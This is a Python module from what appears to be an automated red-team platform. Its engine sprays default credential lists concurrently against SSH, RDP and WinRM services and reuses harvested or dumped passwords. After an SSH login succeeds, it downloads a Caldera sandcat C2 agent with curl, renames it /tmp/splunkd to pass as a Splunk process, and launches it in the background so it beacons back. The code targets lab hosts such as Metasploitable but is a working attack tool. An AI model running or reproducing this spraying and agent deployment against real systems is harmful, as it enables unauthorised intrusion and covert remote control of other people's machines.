# Copyright 2026 Athena Contributors
#
# Use of this software is governed by the Business Source License 1.1
# included in the LICENSE file.
#
# Change Date: Four years from release date of each version
# Change License: Apache License, Version 2.0
#
# For commercial licensing, contact: [TODO: contact email]

"""InitialAccessEngine — multi-protocol credential testing and C2 agent bootstrapping.

Supports SSH (direct), RDP, and WinRM (via MCP credential-checker server).
New protocols can be added by appending to ``_PROTOCOL_MAP`` and
``_CREDS_BY_PROTOCOL`` — no new methods required.
"""

import asyncio
import json
import logging
import uuid
from datetime import datetime, timezone

import aiosqlite

from app.config import settings
from app.models.recon import InitialAccessResult
from app.ws_manager import ws_manager

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Credential lists grouped by protocol family
# ---------------------------------------------------------------------------
_CREDS_BY_PROTOCOL: dict[str, list[tuple[str, str]]] = {
    "ssh": [
        # Linux distro & Vagrant box defaults (sorted by likelihood)
        ("vagrant", "vagrant"),
        ("ubuntu", "ubuntu"),
        ("pi", "raspberry"),
        ("ec2-user", "ec2-user"),
        ("centos", "centos"),
        ("debian", "debian"),
        # Common weak / default passwords
        ("root", "root"),
        ("root", "toor"),
        ("root", "password"),
        ("admin", "admin"),
        ("admin", "password"),
        ("administrator", "administrator"),
        # Lab / CTF environments
        ("msfadmin", "msfadmin"),
        ("user", "user"),
        # Network appliances
        ("cisco", "cisco"),
        ("ubnt", "ubnt"),
        ("apc", "apc"),
    ],
    "windows": [
        # AD / Windows defaults (shared by RDP and WinRM)
        ("Administrator", "Password1"),
        ("Administrator", "P@ssw0rd"),
        ("Administrator", "Admin123"),
        ("Administrator", "administrator"),
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "P@ssw0rd"),
        # Service accounts
        ("svc_sql", "Password1"),
        ("svc_backup", "Password1"),
        # Lab / evaluation VMs
        ("vagrant", "vagrant"),
        ("IEUser", "Passw0rd!"),
    ],
}

# Backward-compatible alias used by existing code
_DEFAULT_CREDS = _CREDS_BY_PROTOCOL["ssh"]

# ---------------------------------------------------------------------------
# Protocol detection table
# (port, service_keywords, protocol, mcp_tool_name, fact_trait, creds_key)
#
# To add a new protocol (e.g. SMB, LDAP, MSSQL):
#   1. Add a creds_key entry in _CREDS_BY_PROTOCOL
#   2. Add a row here
#   3. Add the corresponding @mcp.tool() in credential-checker server.py
# ---------------------------------------------------------------------------
_PROTOCOL_MAP: list[tuple[int, tuple[str, ...], str, str | None, str, str]] = [
    (22,   ("ssh", "unknown"),            "ssh",   None,                      "credential.ssh",   "ssh"),
    (3389, ("ms-wbt-server", "unknown"),  "rdp",   "rdp_credential_check",   "credential.rdp",   "windows"),
    (5985, ("wsman", "http", "unknown"),  "winrm", "winrm_credential_check", "credential.winrm", "windows"),
    (5986, ("wsman", "https", "unknown"), "winrm", "winrm_credential_check", "credential.winrm", "windows"),
]


class InitialAccessEngine:
    """Multi-protocol initial access: credential spraying + agent bootstrapping.

    Entry point for recon pipeline: ``try_initial_access()`` dispatches to SSH
    (direct) or RDP/WinRM (via MCP credential-checker) based on open ports.
    """

    async def try_initial_access(
        self,
        db: aiosqlite.Connection,
        operation_id: str,
        target_id: str,
        ip: str,
        services: list[dict],
    ) -> InitialAccessResult:
        """Orchestrate multi-protocol initial access based on detected open ports.

        Iterates ``_PROTOCOL_MAP`` in order; SSH is tried first (fastest,
        no MCP dependency), then RDP, then WinRM.  Returns the first
        successful result.  If no targetable services are found or all
        protocols fail, returns a combined failure.
        """
        attempted = 0
        for port_num, svc_names, protocol, mcp_tool, trait, creds_key in _PROTOCOL_MAP:
            if not any(
                s.get("port") == port_num and s.get("service", "") in svc_names
                for s in services
            ):
                continue

            attempted += 1

            if protocol == "ssh":
                result = await self.try_ssh_login(
                    db, operation_id, target_id, ip, port=port_num,
                )
            else:
                result = await self._try_mcp_credential_check(
                    db, operation_id, target_id, ip,
                    protocol=protocol, mcp_tool=mcp_tool,
                    trait=trait, creds_key=creds_key, port=port_num,
                )

            if result.success:
                return result

        if attempted == 0:
            return InitialAccessResult(
                success=False, method="none", credential=None,
                agent_deployed=False, error="No targetable services found",
            )
        return InitialAccessResult(
            success=False, method="none", credential=None,
            agent_deployed=False,
            error=f"All protocols failed ({attempted} attempted)",
        )

    # ------------------------------------------------------------------
    # Generalized MCP credential check (RDP, WinRM, future protocols)
    # ------------------------------------------------------------------

    async def _try_mcp_credential_check(
        self,
        db: aiosqlite.Connection,
        operation_id: str,
        target_id: str,
        ip: str,
        *,
        protocol: str,
        mcp_tool: str,
        trait: str,
        creds_key: str,
        port: int,
    ) -> InitialAccessResult:
        """Try credential spray via MCP credential-checker server.

        Works for any protocol registered in ``_PROTOCOL_MAP`` — just
        supply the matching ``mcp_tool`` name and ``trait``.
        """
        from app.services.mcp_client_manager import get_mcp_manager

        mgr = get_mcp_manager()
        if mgr is None or not mgr.is_connected("credential-checker"):
            logger.debug(
                "credential-checker MCP not available; skipping %s check for %s",
                protocol.upper(), ip,
            )
            return InitialAccessResult(
                success=False, method="none", credential=None,
                agent_deployed=False,
                error=f"credential-checker MCP not available for {protocol.upper()}",
            )

        harvested = await self._load_harvested_creds(db, operation_id)
        seen = set(harvested)
        creds = harvested + [
            c for c in _CREDS_BY_PROTOCOL.get(creds_key, []) if c not in seen
        ]

        for username, password in creds:
            try:
                result = await mgr.call_tool(
                    "credential-checker", mcp_tool,
                    {"target": ip, "username": username, "password": password, "port": port},
                )
                text = (
                    result["content"][0]["text"]
                    if result.get("content")
                    else "{}"
                )
                parsed = json.loads(text)

                if parsed.get("facts"):
                    cred_value = parsed["facts"][0]["value"]
                    await self._write_credential_fact(
                        db, operation_id, target_id, cred_value, trait=trait,
                    )
                    await self._register_agent(
                        db, operation_id, target_id, ip,
                        f"{username}:{password}", protocol=protocol,
                    )
                    logger.info(
                        "%s login succeeded for %s@%s:%s",
                        protocol.upper(), username, ip, port,
                    )
                    return InitialAccessResult(
                        success=True,
                        method=f"{protocol}_credential",
                        credential=f"{username}:{password}",
                        agent_deployed=False,
                        error=None,
                    )
            except Exception:
                logger.debug(
                    "%s check failed for %s@%s:%s",
                    protocol.upper(), username, ip, port,
                )
                continue

        logger.warning("All %s credentials failed for %s:%s", protocol.upper(), ip, port)
        return InitialAccessResult(
            success=False, method="none", credential=None,
            agent_deployed=False,
            error=f"All {protocol.upper()} credentials failed",
        )

    async def try_ssh_login(
        self,
        db: aiosqlite.Connection,
        operation_id: str,
        target_id: str,
        ip: str,
        port: int = 22,
    ) -> InitialAccessResult:
        """Attempt SSH login using the default credential list.

        In mock mode a successful result is returned immediately without any
        real network connection.  In real mode every credential in
        ``_DEFAULT_CREDS`` is tried in order; the first success is returned.
        A credential fact is written to the DB on success regardless of mode.
        """
        if settings.MOCK_C2_ENGINE:
            return await self._mock_ssh_result(
                db=db,
                operation_id=operation_id,
                target_id=target_id,
                ip=ip,
                port=port,
            )

        return await self._real_ssh_login(
            db=db,
            operation_id=operation_id,
            target_id=target_id,
            ip=ip,
            port=port,
        )

    # ------------------------------------------------------------------
    # Public helper — C2 agent bootstrapping (real mode only)
    # ------------------------------------------------------------------

    async def bootstrap_c2_agent(
        self,
        ip: str,
        credential: tuple[str, str],
        c2_host: str,
    ) -> bool:
        """Deploy and start a C2 sandcat agent on the remote host via SSH.

        Parameters
        ----------
        ip:
            Target IP address.
        credential:
            ``(username, password)`` tuple.
        c2_host:
            Full ``scheme://host:port`` of the C2 server, e.g.
            ``http://172.17.0.1:58888``.

        Returns ``True`` when the remote commands execute without error and the
        30-second beacon window has elapsed.  Returns ``False`` on any
        exception.
        """
        try:
            import asyncssh  # deferred import — not available in all envs

            from app.config import settings as _settings

            username, password = credential
            async with await asyncssh.connect(
                ip,
                username=username,
                password=password,
                known_hosts=None,
            ) as conn:
                # Detect target architecture to pick the right sandcat binary.
                # Metasploitable 2 is i686 (32-bit); modern systems are x86_64.
                arch_result = await conn.run("uname -m", check=False)
                arch = (arch_result.stdout or "").strip()
                if arch in ("i686", "i386"):
                    sandcat_file = "sandcat.go-linux-386"
                else:
                    sandcat_file = "sandcat.go-linux"

                api_key = _settings.C2_ENGINE_API_KEY or "ADMIN123456"

                # Download sandcat binary
                download_result = await conn.run(
                    f"curl -s -X POST {c2_host}/file/download"
                    f" -H 'platform: linux'"
                    f" -H 'file: {sandcat_file}'"
                    f" -H 'Authorization: {api_key}'"
                    f" -o /tmp/splunkd",
                    check=False,
                )
                if download_result.exit_status != 0:
                    logger.error(
                        "sandcat download failed (arch=%s, file=%s): %s",
                        arch, sandcat_file, download_result.stderr,
                    )
                    return False

                # Verify it's a valid ELF binary (not an error page).
                # Caldera only ships sandcat.go-linux (64-bit); the 32-bit variant
                # (sandcat.go-linux-386) must be manually compiled from the gocat source
                # with Go ≤ 1.17 (Go 1.18+ requires Linux kernel ≥ 2.6.32, but
                # Metasploitable 2 runs 2.6.24 which causes epollcreate1 ENOSYS crash).
                check_result = await conn.run(
                    "head -c 4 /tmp/splunkd | od -An -tx1 | tr -d ' \\n'",
                    check=False,
                )
                magic = (check_result.stdout or "").strip()
                if not magic.startswith("7f454c46"):
                    logger.warning(
                        "sandcat download returned non-ELF content "
                        "(magic=%s, file=%s); skipping agent deployment for %s",
                        magic, sandcat_file, ip,
                    )
                    # Return False: SSH access was achieved but agent could not be deployed.
                    return False

                # Detect kernel version to warn about known incompatibility.
                kernel_result = await conn.run("uname -r", check=False)
                kernel_str = (kernel_result.stdout or "").strip()
                try:
                    major, minor = (int(x) for x in kernel_str.split(".")[:2])
                    if arch in ("i686", "i386") and (major, minor) < (2, 32):
                        # Sandcat compiled with Go 1.18+ crashes on kernels < 2.6.32
                        # due to missing epoll_create1 syscall.  Requires custom build
                        # with Go ≤ 1.17.  See docs/known-limitations.md#sandcat-legacy
                        logger.warning(
                            "Kernel %s is below 2.6.32 — sandcat Go binary may crash "
                            "on %s due to epoll_create1 ENOSYS (requires Go ≤ 1.17 build)",
                            kernel_str, ip,
                        )
                except ValueError:
                    pass  # Couldn't parse kernel version — proceed anyway

                # Make executable
                await conn.run("chmod +x /tmp/splunkd", check=True)
                # Launch agent in background
                await conn.run(
                    f"nohup /tmp/splunkd -server {c2_host} -group red"
                    f" > /tmp/splunkd.log 2>&1 &",
                    check=True,
                )
                logger.info(
                    "C2 sandcat launched on %s (arch=%s, kernel=%s, file=%s, callback=%s)",
                    ip, arch, kernel_str, sandcat_file, c2_host,
                )

            # Wait for agent to beacon home (skip in test/mock-beacon mode)
            if not _settings.C2_MOCK_BEACON:
                await asyncio.sleep(30)
            return True

        except Exception:
            logger.exception(
                "bootstrap_c2_agent failed for %s", ip
            )
            return False

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    async def _register_agent(
        self,
        db: aiosqlite.Connection,
        operation_id: str,
        target_id: str,
        ip_address: str,
        credential: str,
        protocol: str = "ssh",
    ) -> None:
        """Register a synthetic agent record after successful credential validation.

        paw format: ``'{PROTOCOL}-{ip_address}'`` (e.g. ``SSH-10.0.1.5``).
        Platform is inferred from protocol: rdp/winrm → ``windows``, ssh → ``linux``.
        """
        paw = f"{protocol.upper()}-{ip_address}"
        platform = "windows" if protocol in ("rdp", "winrm") else "linux"
        is_admin = credential.startswith("root:") or credential.lower().startswith("administrator:")
        privilege = "root" if is_admin else "user"
        now = datetime.now(timezone.utc).isoformat()

        # Upsert: update existing agent or insert new one
        existing = await db.execute(
            "SELECT id FROM agents WHERE paw = ? AND operation_id = ?",
            (paw, operation_id),
        )
        row = await existing.fetchone()
        if row:
            await db.execute(
                "UPDATE agents SET host_id=?, status='alive', privilege=?, platform=?, last_beacon=? WHERE id=?",
                (target_id, privilege, platform, now, row[0]),
            )
        else:
            await db.execute(
                """INSERT INTO agents
                    (id, paw, host_id, status, privilege, platform, operation_id, last_beacon)
                VALUES (?, ?, ?, 'alive', ?, ?, ?, ?)""",
                (str(uuid.uuid4()), paw, target_id, privilege, platform, operation_id, now),
            )
        await db.commit()

    # Backward-compatible alias
    async def _register_ssh_agent(self, db, operation_id, target_id, ip_address, credential):
        return await self._register_agent(db, operation_id, target_id, ip_address, credential, protocol="ssh")

    async def _mock_ssh_result(
        self,
        db: aiosqlite.Connection,
        operation_id: str,
        target_id: str,
        ip: str,
        port: int,
    ) -> InitialAccessResult:
        """Return a deterministic mock success without any real network I/O."""
        cred_str = f"msfadmin:msfadmin@{ip}:{port}"
        await self._write_credential_fact(
            db=db,
            operation_id=operation_id,
            target_id=target_id,
            cred_value=cred_str,
        )
        return InitialAccessResult(
            success=True,
            method="ssh_credential",
            credential="msfadmin:msfadmin",
            agent_deployed=False,
            error=None,
        )

    async def _load_harvested_creds(
        self,
        db: aiosqlite.Connection,
        operation_id: str,
    ) -> list[tuple[str, str]]:
        """Load credential facts already collected in this operation.

        Returns a deduplicated list of (username, password) tuples, parsed from
        facts with category='credential'.  Supported value formats:
        - ``user:pass@host:port``  (written by ``_write_credential_fact``)
        - ``user:pass``            (plaintext dump format)
        """
        db.row_factory = aiosqlite.Row
        cursor = await db.execute(
            "SELECT value FROM facts "
            "WHERE operation_id = ? AND category = 'credential' "
            "AND trait IN ('credential.ssh', 'credential.rdp', 'credential.winrm', "
            "'credential.plaintext', 'credential.dumped') "
            "ORDER BY score DESC, collected_at DESC",
            (operation_id,),
        )
        rows = await cursor.fetchall()

        seen: set[tuple[str, str]] = set()
        creds: list[tuple[str, str]] = []
        for row in rows:
            val: str = row["value"]
            # Strip @host:port suffix if present
            user_pass = val.split("@")[0] if "@" in val else val
            if ":" in user_pass:
                u, p = user_pass.split(":", 1)
                pair = (u.strip(), p.strip())
                if pair not in seen:
                    seen.add(pair)
                    creds.append(pair)
        return creds

    async def _real_ssh_login(
        self,
        db: aiosqlite.Connection,
        operation_id: str,
        target_id: str,
        ip: str,
        port: int,
    ) -> InitialAccessResult:
        """Try credentials via asyncssh with parallel spray (Semaphore=5)."""
        import asyncssh  # deferred import

        # Prepend harvested credentials from this operation (highest priority)
        harvested = await self._load_harvested_creds(db, operation_id)
        seen_in_harvested = set(harvested)
        ordered_creds = harvested + [c for c in _DEFAULT_CREDS if c not in seen_in_harvested]

        semaphore = asyncio.Semaphore(5)
        found_event = asyncio.Event()
        result_holder: list[InitialAccessResult] = []

        async def _try_one(username: str, password: str) -> None:
            if found_event.is_set():
                return
            async with semaphore:
                if found_event.is_set():
                    return
                try:
                    logger.debug(
                        "Trying SSH %s@%s:%s with password %s",
                        username, ip, port, password,
                    )
                    async with await asyncio.wait_for(
                        asyncssh.connect(
                            ip,
                            port=port,
                            username=username,
                            password=password,
                            known_hosts=None,
                        ),
                        timeout=8.0,
                    ):
                        # Connection succeeded — record the credential
                        cred_str = f"{username}:{password}@{ip}:{port}"
                        await self._write_credential_fact(
                            db=db,
                            operation_id=operation_id,
                            target_id=target_id,
                            cred_value=cred_str,
                        )
                        logger.info(
                            "SSH login succeeded for %s@%s:%s", username, ip, port
                        )

                        # Register SSH agent record (enables DirectSSHEngine routing)
                        await self._register_ssh_agent(
                            db,
                            operation_id,
                            target_id,
                            ip,
                            f"{username}:{password}",
                        )

                        # Bootstrap C2 agent only when EXECUTION_ENGINE=c2
                        if settings.EXECUTION_ENGINE == "c2":
                            c2_host = (
                                settings.C2_AGENT_CALLBACK_URL or settings.C2_ENGINE_URL
                            )
                            await self.bootstrap_c2_agent(
                                ip=ip,
                                credential=(username, password),
                                c2_host=c2_host,
                            )

                        result_holder.append(InitialAccessResult(
                            success=True,
                            method="ssh_credential",
                            credential=f"{username}:{password}",
                            agent_deployed=False,
                            error=None,
                        ))
                        found_event.set()
                except (asyncssh.Error, OSError, asyncio.TimeoutError):
                    logger.debug(
                        "SSH login failed for %s@%s:%s", username, ip, port
                    )

        tasks = [asyncio.create_task(_try_one(u, p)) for u, p in ordered_creds]
        await asyncio.wait(tasks)

        # Cancel any stragglers (shouldn't be any after wait, but safety)
        for t in tasks:
            if not t.done():
                t.cancel()

        if result_holder:
            return result_holder[0]

        logger.warning("All SSH credentials failed for %s:%s", ip, port)
        return InitialAccessResult(
            success=False,
            method="none",
            credential=None,
            agent_deployed=False,
            error="All credentials failed",
        )

    async def _write_credential_fact(
        self,
        db: aiosqlite.Connection,
        operation_id: str,
        target_id: str,
        cred_value: str,
        trait: str = "credential.ssh",
    ) -> None:
        """Insert a credential fact into the facts table and broadcast it."""
        fact_id = str(uuid.uuid4())
        now = datetime.now(timezone.utc).isoformat()

        await db.execute(
            "INSERT OR IGNORE INTO facts "
            "(id, trait, value, category, source_technique_id, "
            "source_target_id, operation_id, score, collected_at) "
            "VALUES (?, ?, ?, ?, NULL, ?, ?, 1, ?)",
            (fact_id, trait, cred_value, "credential", target_id, operation_id, now),
        )
        await db.commit()

        # Broadcast unconditionally — DB-level UNIQUE index handles dedup
        fact_payload = {
            "id": fact_id,
            "trait": trait,
            "value": cred_value,
            "category": "credential",
            "source_target_id": target_id,
            "operation_id": operation_id,
        }
        await ws_manager.broadcast(operation_id, "fact.new", fact_payload)
